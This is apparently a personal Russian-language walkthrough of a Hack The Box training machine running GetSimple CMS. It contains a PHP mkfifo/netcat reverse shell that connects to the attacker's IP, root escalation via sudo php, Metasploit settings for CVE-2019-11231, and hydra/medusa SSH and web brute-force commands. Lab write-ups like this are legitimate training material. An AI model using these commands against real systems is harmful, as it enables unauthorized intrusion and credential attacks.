Nmap scan report for 10.129.20.166
Host is up (0.054s latency).
Not shown: 998 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel




Title страницы: "Welcome to GetSimple! - gettingstarted" — это CMS GetSimple (open-source flat-file CMS на PHP, популярна в old HTB машинах). Версия вероятно старая (GetSimple 3.x), vulnerable к
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
| http-robots.txt: 1 disallowed entry 
|_/admin/
|_http-title: Welcome to GetSimple! - gettingstarted



PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.1 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-server-header: Apache/2.4.41 (Ubuntu)
| http-enum: 
|   /admin/: Possible admin folder
|   /admin/index.php: Possible admin folder
|   /backups/: Backup folder w/ directory listing
|   /robots.txt: Robots file
|_  /data/: Potentially interesting directory w/ listing on 'apache/2.4.41 (ubuntu)'



Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 278]
/.htaccess            (Status: 403) [Size: 278]
/.htpasswd            (Status: 403) [Size: 278]
/admin                (Status: 301) [Size: 314] [--> http://10.129.20.166/admin/]
/backups              (Status: 301) [Size: 316] [--> http://10.129.20.166/backups/]
/data                 (Status: 301) [Size: 313] [--> http://10.129.20.166/data/]
/index.php            (Status: 200) [Size: 5485]
/plugins              (Status: 301) [Size: 316] [--> http://10.129.20.166/plugins/]
/robots.txt           (Status: 200) [Size: 32]
/server-status        (Status: 403) [Size: 278]
/sitemap.xml          (Status: 200) [Size: 431]
/theme                (Status: 301) [Size: 314] [--> http://10.129.20.166/theme/]
Progress: 4723 / 4724 (99.98%)



После проверок всех папок найдет файл:
http://10.129.20.166/data/users/admin.xml
данные:
<item>
<USR>admin</USR>
<NAME/>
<PWD>d033e22ae348aeb5660fc2140aec35850c4da997</PWD>
<EMAIL>admin@gettingstarted.com</EMAIL>
<HTMLEDITOR>1</HTMLEDITOR>
<TIMEZONE/>
<LANG>en_US</LANG>
</item>



Логин:
admin
Пароль:
admin



В темах редактируем шаблон 
Меняем весь код на 
<?php
system("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.155 4444 >/tmp/f");
?>

Слушаем порт:
4444




Запускаем скрипт:
curl http://10.129.20.166/theme/Innovation/template.php



Получаем доступ к пользователю:
connect to [10.10.15.155] from (UNKNOWN) [10.129.20.166] 43480
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data

$ python3 -c 'import pty; pty.spawn("/bin/bash")'
www-data@gettingstarted:/var/www/html/theme/Innovation$ sudo -l
sudo -l
Matching Defaults entries for www-data on gettingstarted:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User www-data may run the following commands on gettingstarted:
    (ALL : ALL) NOPASSWD: /usr/bin/php
www-data@gettingstarted:/var/www/html/theme/Innovation$ ls


Используем скрипт на найденом файле для эскалации до рута:
sudo /usr/bin/php -r 'pcntl_exec("/bin/sh", array("-i"));'



получаем:
www-data@gettingstarted:/usr/bin$ sudo /usr/bin/php -r 'pcntl_exec("/bin/sh", array("-i"));'
<sr/bin/php -r 'pcntl_exec("/bin/sh", array("-i"));'
# whoami
whoami
root


Очивка есть можно поесть:
https://academy.hackthebox.com/achievement/2182889/77



whatweb 10.129.20.166
http://10.129.20.166 [200 OK] AddThis, Apache[2.4.41], Country[RESERVED][ZZ], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.129.20.166], Script[text/javascript], Title[Welcome to GetSimple! - gettingstarted]



GetSimple 3.3.15
Версия 3.3.15 уязвима к:

CVE-2019-11231 (Unauth RCE): Недостаточная санитизация в admin/theme-edit.php позволяет загружать произвольный контент (например, PHP-шеллы) как файлы темы. Логин не нужен, если misconfig (часто в CTF).
Другие: Stored XSS (CVE-2019-16333 в theme-edit), file upload (через плагины/темы), но RCE — основной
msfconsole
search getsimple
use exploit/multi/http/getsimplecms_unauth_code_exec  # Соответствует CVE-2019-11231
set RHOSTS 10.129.20.166
set TARGETURI /
set LHOST <ваш_HTB_VPN_IP>  # например, 10.10.14.x из tun0
set LPORT 4444
run




Полезная команда:
nmap -p22 --script "ssh*" 10.129.20.166 (юзает все доступные скрипты для ssh) 
nmap -p22 --script ssh2-enum-algos,ssh-hostkey,ssh-auth-methods,ssh-publickey-acceptance <IP> (Полный SSH-enum)




hydra -t 4 -L /usr/share/seclists/Usernames/top-usernames.txt -P /usr/share/wordlists/rockyou.txt ssh://<IP> (Brute-force с Hydra (большой словарь, slow для избежания bans))

hydra -l user -P /usr/share/wordlists/rockyou.txt ssh://10.129.20.166 (brute-force для множества протоколов (SSH, HTTP, FTP, SMB и т.д.))

-l user: Фиксированный логин (username)
-P /usr/share/wordlists/rockyou.txt: Словарь паролей (-P для password list). Rockyou.txt — классический словарь (из утечки RockYou, ~14 млн паролей)

hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt ssh://<IP> (Brute-force SSH с словарем юзеров и паролей (если не знаете точный логин))

hydra -l admin -P /usr/share/wordlists/rockyou.txt <IP> http-get /admin/   (Brute-force HTTP basic auth (для /admin/ из вашего вывода))

hydra -l admin -P rockyou.txt <IP> http-post-form "/admin/login.php:user=^USER^&pass=^PASS^:F=incorrect" -V  (Brute-force web forms (если логин-форма, как в CMS))

medusa -h <IP> -u user -P rockyou.txt -M ssh (Medusa (альтернатива Hydra, иногда быстрее))

nmap -p22 --script ssh-brute --script-args userdb=/path/to/users.txt,passdb=rockyou.txt <IP> (Nmap brute-script (простой чек без внешних tools))